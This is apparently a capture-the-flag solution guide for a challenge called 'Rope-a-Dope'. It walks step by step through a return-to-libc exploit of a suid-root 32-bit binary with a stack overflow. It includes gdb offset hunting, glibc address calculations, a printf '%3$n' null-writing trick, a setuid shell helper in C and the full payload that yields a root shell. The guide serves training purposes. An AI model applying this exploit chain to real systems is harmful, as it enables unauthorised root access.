# Rope-a-Dope

_Solution Guide_

## Overview

This is an infinity style challenge. This solution guide covers the walk-through organized by submission question. The steps used to solve all challenge instances will be similar, but the answer will vary for Question 2. 

**To get started:** use your `kali` machine to log into the `cube` server. You have regular `user` access, and find that `su`, `sudo`, and any other *standard* approach of gaining `root` access on `cube` is unavailable.

## Question 1

_What is the offset (in decimal bytes, relative to the start of the overflowing buffer) of the vulnerable function's caller's return address?_

The correct answer to Question 1 (a static answer) is: `76` . The walk-through shows how to arrive at that answer.

### Initial analysis of `/usr/sbin/chk_cube_cmd`

```
$ ls -alh /usr/sbin/chk_cube_cmd 
-rwsr-xr-x 1 root root 14K Sep 10 13:21 /usr/sbin/chk_cube_cmd
```

This confirms it's a `suid-root` program. So, if we can find a way to attack it - such as a buffer overflow - we can use it to execute a
privilege escalation attack.

```
$ file /usr/sbin/chk_cube_cmd
/usr/sbin/chk_cube_cmd: setuid ELF 32-bit LSB executable, Intel 80386,
version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=a75271f6c425fbdc44814145d6c6d0701e494f9a, for GNU/Linux 3.2.0,
stripped
```

It's a 32-bit `i386` binary, which lets us know how the stack is used for passing arguments during function calls.

```
$ ldd /usr/sbin/chk_cube_cmd    
	linux-gate.so.1 (0xf7fcf000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dcc000)
	/lib/ld-linux.so.2 (0xf7fd1000)
```

This is further confirmation we're dealing with a 32-bit program. Also, it's dynamically linked against 32-bit glibc (`libc.so.6`), which starts at 32-bit address `0xf7dcc000` within the virtual address space of the `chk_cube_cmd` process during execution.

```
$ checksec --file=/usr/sbin/chk_cube_cmd

RELRO          STACK CANARY     NX          PIE     RPATH     RUNPATH
Partial RELRO  No canary found  NX enabled  No PIE  No RPATH  No RUNPATH

Symbols		FORTIFY	Fortified	Fortifiable  FILE
No Symbols  No  	0		    2	         /usr/sbin/chk_cube_cmd
```

The binary was compiled without gcc's implicit `stack-protector` feature. It does, however, have a *non-executable stack*, so a "classic" buffer overflow (with on-stack shell-code execution) won't work.

```
$ cat /proc/sys/kernel/randomize_va_space 
0
```

ASLR is disabled, so virtual addresses will *not* change between subsequent executions of `chk_cube_cmd`.

Our next move is to figure out whether we can crash the program by entering an exceedingly long argument:

```
$ chk_cube_cmd $(python2 -c 'print "A"*64')
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Verified.

$ chk_cube_cmd $(python2 -c 'print "A"*69')
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  chk_cube_cmd $(python2 -c 'print "A"*68')
```

The buffer is probably 64 characters long, and overflows if we exceed that limit. We can figure out where the vulnerable function (the one containing the overflowing on-stack buffer) keeps its return address by using `gdb`:

```
$ gdb -q --args chk_cube_cmd $(python2 -c 'print "A"*69')
Reading symbols from chk_cube_cmd...
(No debugging symbols found in chk_cube_cmd)
(gdb) r
Starting program: /usr/sbin/chk_cube_cmd AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
(gdb) q
...

$ gdb -q --args chk_cube_cmd $(python2 -c 'print "A"*80')
Reading symbols from chk_cube_cmd...
(No debugging symbols found in chk_cube_cmd)
(gdb) r
Starting program: /usr/sbin/chk_cube_cmd AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) q
...
```

We can confirm that the return address is at a 76-byte offset from the start of the on-stack buffer:

```
$ gdb -q --args chk_cube_cmd $(python2 -c 'print "A"*76 + "\xef\xbe\xad\xde"')
Reading symbols from chk_cube_cmd...
(No debugging symbols found in chk_cube_cmd)
(gdb) r
Starting program: /usr/sbin/chk_cube_cmd AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAﾭ�

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
```

The program segfaults after "returning" to the invalid "caller" address of `0xdeadbeef`. This answers Question 1.

## Question 2

_What is the content of `/root/token.txt` on the `cube` server?_

As mentioned above, an attempt at injecting executable shellcode into the stack and returning to *it* will fail due to the `NX` attribute being enabled on the memory region containing the stack.

```
$ ldd /usr/sbin/chk_cube_cmd    
	linux-gate.so.1 (0xf7fcf000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dcc000)
	/lib/ld-linux.so.2 (0xf7fd1000)
```

Let's once again make a note of the address at which `glibc` is mapped into the process address space: `0xf7dcc000`. This is the answer to the second question (worth 5%).

It may be relatively straightforward to get `chk_cube_cmd` to execute a shell by arranging a "return" to the `system()` function in `glibc`, and providing it with a pointer to the string `"/bin/sh"`,  to force the program to call `system("/bin/sh")`.

Let's find out what the offset of `system()` is within `glibc`:

```
$ readelf -all /lib32/libc.so.6 | grep ' system'
  1537: 00041360    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
```

The offset of `system()` is `0x00041360`.

Since the offset is relative to the start of `glibc`, the absolute address within the process virtual memory at which `system()` is located will be `0xf7dcc000 + 0x00041360 = 0xf7e0d360`.

To call `system()` with an argument, the stack needs to contain the following data:

```
... | addr. of system() | ret. addr. from system() | 1st arg. to system() | ...
```

If we wanted `system()` to "return" to, e.g., `exit()`, we should also find the latter's absolute address within the process virtual memory:

```
$ readelf -all /lib32/libc.so.6 | grep ' exit'
   150: 00033ec0    39 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.0
```

This gets us an absolute address for `exit()` of `0xf7dffec0`.

Finally, we try to find an address for a pre-existing copy of the string `"/bin/sh"` inside `glibc`:

```
$ strings -tx /lib32/libc.so.6 | grep '/bin/sh'
 18b363 /bin/sh
```

The *relative* address of the string `"/bin/sh"` within `glibc` is `0x0018b363`.

The *absolute* address of `"/bin/sh"` within the process virtual memory is `0xf7f57363`.

Remember that Intel is a Little Endian architecture, so 32-bit addresses are physically represented beginning with the *least* significant byte.

We launch the attack:

```
$ chk_cube_cmd \
  $(python2 -c 'print "A"*76 + "\x60\xd3\xe0\xf7\xc0\xfe\xdf\xf7\x63\x73\xf5\xf7"')
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA`�������cs��
$ whoami
user
$ exit
```

The problem is that `system("/bin/sh")` will drop root privileges before executing the shell, as also specified in the `man 3 system` documentation.

Instead, we have to get `chk_cube_cmd` to run a different program of our own making. We could pick a name for which we already have an existing string in `glibc`, e.g., `"setuid"`:

```
$ strings -tx /lib32/libc.so.6 | grep 'setuid'
   e0d8 setuid
```

The `"setuid"` string will be found at the absolute address `0xf7dda0d8`.

Let's write a `setuid.c` program:

```
#include <unistd.h>

int main(int argc, char *argv[]) {
        setuid(0);
        execl("/bin/sh", "/bin/sh", NULL);
}
```

...and compile it:

```
gcc -o setuid setuid.c -Wall
```

...then ensure $PATH includes the current directory:

```
$ export PATH="$PATH:."
```

We would like to place the following data on the stack, starting with the first return address being overwritten via the vulnerable buffer:

```
... | execl() | <dont_care> | "setuid" | "setuid" | NULL | ...
```

...but we can't push four `\x00` bytes onto the stack before `chk_cube_cmd` will stop reading after the very first '\0' ("null character"). We need an additional trick that programmatically generates a 32-bit `NULL` and writes it onto the stack at the end of our "exploit" string.

That trick relies on `printf()`, which, when provided with the format string `"%3$n"`, will write the number of characters outputted thus far (0) to the location pointed to by its third argument. The exploit string is:

```
... | printf() | execl() | "%3$n" | "setuid" | "setuid" | here_ptr | ...
```

We need `here_ptr` to point to its *own* address, so that `printf()` will, as directed by its format string (`"%3$n"`), write `0x00000000` to the address given by its third argument (`here_ptr`). Thus, upon "returning", `printf()` will have prepared the third argument to `execl()` to now be `NULL`. At this point, `execl()` can launch our `setuid` program which will start a shell *without* first dropping `root` privileges!

Let's find addresses for `printf()` and `execl()`, respectively:

```
$ readelf -all /lib32/libc.so.6 | grep ' printf'
   685: 0004fd30    45 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.0


$ readelf -all /lib32/libc.so.6 | grep ' execl'
   152: 000c8580   319 FUNC    GLOBAL DEFAULT   15 execl@@GLIBC_2.0
```

The absolute address for `printf()` will be `0xf7e1bd30`, and the absolute address for `execl()` will be `0xf7e94580`. As calculated earlier, the "setuid" string will be found at `0xf7dda0d8`.

Next, we must make available a pointer to the string `"%3$n"`. We are unlikely to have a matching string in either `glibc` or in `chk_cube_cmd` itself. We can, however, add it to the environment:

```
$ export FMT='%3$n'
$ echo $FMT
%3$n
```

We can then calculate the address within a process virtual memory space at which the actual environment string value is mapped by saving the following program as `chk_cube_fmt.c`:

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	printf("%p\n", getenv("FMT"));
	return 0;
}
```

...and compiling it in a way that matches the `chk_cube_cmd` executable:

```
$ gcc -m32 -o chk_cube_fmt chk_cube_fmt.c -Wall
```

> **Note:** The address returned is *extremely* sensitive to the length of the program name (`argv[0]`, as invoked on the command line).

If you plan to run `chk_cube_cmd` without prefixing it with a path name, then also place `chk_cube_fmt` somewhere in `$PATH` (same place as `setuid`would likely work). Both program names have to be equally long when invoked, so that the pointer to the `"%3$n"` value of `$FMT` would end up at the same address in virtual memory across the two processes! We get the following
address for the pointer to `"%3$n"`:

```
$ chk_cube_fmt 
0xffffd7a3
```

> **Note:** This also depends on the size of your existing environment, so you may get a different value when following these instructions!

Finally, we need the virtual memory address at which the `here_ptr` pointer is located above the buffer. We can find that out (after adding `$FMT` to  the environment because modifying the size of the environment will affect subsequent placement of stack elements!) by running the `chk_cube_cmd` program in `gdb`, and dumping the stack looking for the value `0xcafebabe`:

```
$ gdb -q --args chk_cube_cmd \
  $(python2 -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*16 + "\xbe\xba\xfe\xca"')
...
(gdb) r
...
(gdb) x/32z $esp
...
(gdb) 
0xffffd6e0:     0x7e11d213      0xe060dc03      0x691c75fe      0x00363836
0xffffd6f0:     0x00000000      0x00000000      0x7273752f      0x6962732f
0xffffd700:     0x68632f6e      0x75635f6b      0x635f6562      0x4100646d
0xffffd710:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd720:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd730:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd740:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd750:     0x41414141      0x41414141      0xef414141      0x42deadbe
(gdb) 
0xffffd760:     0x42424242      0x42424242      0x42424242      0xbe424242
0xffffd770:     0x00cafeba      0x4c454853      0x622f3d4c      0x622f6e69
0xffffd780:     0x00687361      0x3d544d46      0x6e243325      0x44575000
0xffffd790:     0x6f682f3d      0x752f656d      0x00726573      0x4e474f4c
0xffffd7a0:     0x3d454d41      0x72657375      0x47445800      0x5345535f
0xffffd7b0:     0x4e4f4953      0x5059545f      0x74743d45      0x3d5f0079
0xffffd7c0:     0x7273752f      0x6e69622f      0x6264672f      0x544f4d00
0xffffd7d0:     0x48535f44      0x3d4e574f      0x006d6170      0x454e494c
(gdb)
```

We notice that the value `0xcafebabe` starts at address `0xffffd76f`, which should also be the (self-referencing) address of `here_ptr`.

To recap: we must place 76 junk bytes (e.g., "A") into the buffer, followed by:

|             |              |                    |
|-------------|--------------|--------------------|
| `printf()`  | `0xf7e1bd30` | `\x30\xbd\xe1\xf7` |
| `execl()`   | `0xf7e94580` | `\x80\x45\xe9\xf7` |
| `"%3$n"`    | `0xffffd7a3` | `\xa3\xd7\xff\xff` |
| `"setuid"`  | `0xf7dda0d8` | `\xd8\xa0\xdd\xf7` |
| `"setuid"`  | `0xf7dda0d8` | `\xd8\xa0\xdd\xf7` |
| `&here_ptr` | `0xffffd76f` | `\x6f\xd7\xff\xff` |

We perform our exploit:

```
$ chk_cube_cmd \
  $(python2 -c 'print "A"*76 + "\x30\xbd\xe1\xf7\x80\x45\xe9\xf7\xa3\xd7\xff\xff\xd8\xa0\xdd\xf7\xd8\xa0\xdd\xf7\x6f\xd7\xff\xff"')
cube_cmd: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA0����E������ؠ��ؠ��o���
# whoami
root
# ls /root
snap  token.txt
# cat /root/token.txt
...
```

...and find the answer to the second question.
